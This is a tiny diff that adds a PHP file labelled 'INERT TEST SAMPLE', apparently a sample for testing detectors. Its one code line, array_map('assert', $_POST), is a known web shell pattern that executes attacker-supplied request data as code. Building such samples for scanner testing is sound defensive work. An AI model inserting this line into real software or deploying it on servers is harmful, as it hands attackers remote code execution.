@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+array_map('assert', $_POST);
+
